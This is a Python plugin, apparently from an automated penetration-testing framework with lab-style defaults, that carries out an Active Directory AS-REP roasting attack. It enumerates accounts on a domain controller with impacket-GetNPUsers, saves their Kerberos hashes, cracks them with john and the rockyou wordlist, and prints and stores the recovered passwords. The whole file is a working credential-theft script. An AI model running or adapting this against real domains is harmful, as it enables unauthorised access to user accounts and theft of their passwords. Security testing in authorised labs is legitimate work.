import lib.host as Host
import os


def parameters() -> dict:
    return {
        "distinguish_name": {
            "type": str,
            "description": "The domain controller to query. Example: htb.local",
            "required": True
        },
        "userEnumCmd": {
            "type": str,
            "description": "The query string to execute.",
            "required": True,
            "default": "impacket-GetNPUsers -request -format hashcat -outputfile result.txt -dc-ip $$config:DefaultConnections.targetMachine <DISTINGUISH_NAME>/"
        },
        "pwCrackCmd": {
            "type": str,
            "description": "The query string to execute.",
            "required": True,
            "default": "john --wordlist=/usr/share/wordlists/rockyou.txt result.txt"
        },
        "return": {
            "type": str,
            "description": "Returns the result of ldap search."
        }
    }


def init() -> tuple:
    if not os.path.isfile("/usr/share/wordlists/rockyou.txt"):
        print("Preparing wordlists...")
        if Host.executeShellScript(["which", "wordlists"])[1] == "":
            Host.executeShellScript(["sudo", "apt", "install", "wordlists"])
        # Extract /usr/share/wordlists/rockyou.txt.gz
        success = Host.executeShellScript(["gunzip", "/usr/share/wordlists/rockyou.txt.gz"])
        if success[0] != 0:
            print("Failed to extract wordlist.")
            print("STDOUT: ", success[1])
            print("STDERR: ", success[2])
            return False, "Failed to extract wordlist."

    if not os.path.isfile("/usr/share/wordlists/rockyou.txt"):
        print("Wordlist not found.")
        return False, "Wordlist not found."
    return True, ""


def resultAnalysis(result: tuple) -> str:
    if result[0] == 0:
        from lib.memory import Memory
        Memory.set("ldap_search_users", result[1])
        return result[1]
    else:
        return "STDOUT: " + result[1] + "\n\n\nSTDERR: " + result[2]


def kali(distinguish_name: str, userEnumCmd: str, pwCrackCmd: str) -> tuple:
    userEnumCmd = userEnumCmd.replace("<DISTINGUISH_NAME>", distinguish_name)
    commandStruct = userEnumCmd.split(" ")

    print("Running user enumeration...")
    searchResult = Host.executeShellScript(commandStruct)
    if searchResult[0] != 0:
        print("User enumeration failed.")
        print("STDOUT: ", searchResult[1])
        print("STDERR: ", searchResult[2])
        return searchResult

    print("Cracking passwords...")
    commandStruct = pwCrackCmd.split(" ")
    crackResult = Host.executeShellScript(commandStruct)
    if crackResult[0] != 0:
        print("Password cracking failed.")
        print("STDOUT: ", crackResult[1])
        print("STDERR: ", crackResult[2])
        return crackResult

    print("User enumeration and password cracking successful.")
    commandStruct = ["john", "--show", "result.txt"]
    crackResult = Host.executeShellScript(commandStruct)
    if crackResult[0] != 0:
        print("Password show failed.")
        print("STDOUT: ", crackResult[1])
        print("STDERR: ", crackResult[2])
        return crackResult

    return crackResult
